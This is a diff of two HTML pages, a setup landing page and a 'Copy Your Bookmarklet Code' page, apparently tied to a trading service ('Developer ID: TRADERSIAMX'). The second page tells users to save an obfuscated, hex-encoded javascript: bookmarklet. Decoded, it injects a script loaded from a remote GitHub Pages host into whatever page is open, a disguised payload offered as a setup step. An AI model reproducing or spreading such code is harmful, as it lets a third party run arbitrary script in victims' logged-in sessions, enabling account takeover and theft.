@@ -1,4 +1,3 @@
-<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -233,19 +232,19 @@
       <div class="setup-box">
         <h3><i class="fab fa-windows"></i> Windows Setup</h3>
         <p>Complete guide to install and configure on Windows devices.</p>
-        <a href="ui-setup.html" class="btn-windows"><i class="fas fa-play"></i> Watch Setup Video</a>
+        <a href="#" class="btn-windows"><i class="fas fa-play"></i> Watch Setup Video</a>
       </div>
 
       <div class="setup-box">
         <h3><i class="fab fa-android"></i> Android Setup</h3>
         <p>Step-by-step instructions for Android smartphones and tablets.</p>
-        <a href="ui-setup.html" class="btn-android"><i class="fas fa-play"></i> Watch Setup Video</a>
+        <a href="#" class="btn-android"><i class="fas fa-play"></i> Watch Setup Video</a>
       </div>
 
       <div class="setup-box">
         <h3><i class="fab fa-apple"></i> iOS Setup</h3>
         <p>Installation guide for iPhone and iPad users.</p>
-        <a href="ui-setup.html" class="btn-ios"><i class="fas fa-play"></i> Watch Setup Video</a>
+        <a href="#" class="btn-ios"><i class="fas fa-play"></i> Watch Setup Video</a>
       </div>
     </div>
 
@@ -256,10 +255,6 @@
 
 </body>
 </html>
-
-
-
-<!-- ui-setup.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -278,93 +273,94 @@
 
     body {
       font-family: 'Inter', sans-serif;
-      background: #fff;
-      color: #222;
+      background: #f5f5f5;
       padding: 40px 20px;
-      max-width: 900px;
+      color: #222;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 700px;
       margin: 0 auto;
+      background: white;
+      padding: 30px 40px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      text-align: center;
     }
 
     h1 {
+      margin-bottom: 20px;
       font-weight: 700;
-      font-size: 36px;
-      text-align: center;
-      margin-bottom: 30px;
+      font-size: 28px;
       color: #4b56e9;
     }
 
-    textarea {
+    .code-box {
       width: 100%;
-      height: 120px;
+      background: #1e1e1e;
+      color: #eee;
       font-family: monospace;
-      font-size: 14px;
-      padding: 15px;
-      border-radius: 12px;
-      border: 2px solid #4b56e9;
-      background: #f0f0f5;
-      color: #000;
-      resize: none;
-    }
-
-    .code-label {
-      font-weight: 600;
-      margin-bottom: 10px;
-      color: #4b56e9;
-    }
-
-    .copy-btn {
-      margin-top: 10px;
-      background-color: #4b56e9;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 10px;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 6px 12px rgba(75, 86, 233, 0.6);
-      transition: background-color 0.3s ease;
-      display: block;
-    }
-
-    .copy-btn:hover {
-      background-color: #3742fa;
-    }
-
-    .info {
-      margin-top: 25px;
       font-size: 16px;
-      color: #444;
-      text-align: center;
+      padding: 20px;
+      border-radius: 10px;
+      user-select: all;
+      white-space: pre-wrap;
+      text-align: left;
+      margin-bottom: 20px;
+      overflow-x: auto;
+    }
+
+    .btn-copy {
+      background: #4b56e9;
+      border: none;
+      color: white;
+      font-weight: 600;
+      padding: 12px 25px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 16px;
+      box-shadow: 0 5px 10px rgba(75, 86, 233, 0.5);
+      transition: background 0.3s ease;
+      user-select: none;
+    }
+
+    .btn-copy:hover {
+      background: #3742fa;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #666;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h1>Copy Your Bookmarklet Code</h1>
 
-  <h1>UI Setup</h1>
-
-  <div class="code-label">Copy the bookmarklet code below:</div>
-  <textarea id="bookmarklet-code" readonly>
+    <pre id="code" class="code-box">
 javascript:(function(){var _0x3afc=["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x69\x61\x6D\x7A\x73\x61\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x73\x69\x61\x6D\x78\x62\x75\x2F","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var _0x26c2=function(_0x3f4f4e,_0x4b51f5){_0x3f4f4e=_0x3f4f4e-0x0;var _0x316e2a=_0x3afc[_0x3f4f4e];return _0x316e2a;};var x=document[_0x26c2("0x0")]("script");x[_0x26c2("0x1")]=_0x26c2("0x2");document[_0x26c2("0x4")][_0x26c2("0x3")](x);})();
-  </textarea>
-  <button class="copy-btn" data-clipboard-target="#bookmarklet-code">Copy Code</button>
+    </pre>
 
-  <div class="info">Click the button above to copy the bookmarklet code. Then add it as a bookmark in your browser.</div>
+    <button class="btn-copy" data-clipboard-target="#code"><i class="fas fa-copy"></i> Copy Code</button>
+
+    <div class="footer">Developer ID: TRADERSIAMX</div>
+  </div>
 
   <script>
-    var clipboard = new ClipboardJS('.copy-btn');
+    // ClipboardJS initialization
+    const clipboard = new ClipboardJS('.btn-copy');
 
-    clipboard.on('success', function(e) {
-      e.trigger.textContent = 'Copied!';
-      setTimeout(() => {
-        e.trigger.textContent = 'Copy Code';
-      }, 2000);
+    clipboard.on('success', e => {
       e.clearSelection();
+      alert('Code copied to clipboard!');
     });
 
-    clipboard.on('error', function(e) {
-      alert('Failed to copy. Please copy manually.');
+    clipboard.on('error', e => {
+      alert('Failed to copy the code. Please copy manually.');
     });
   </script>
-
 </body>
 </html>
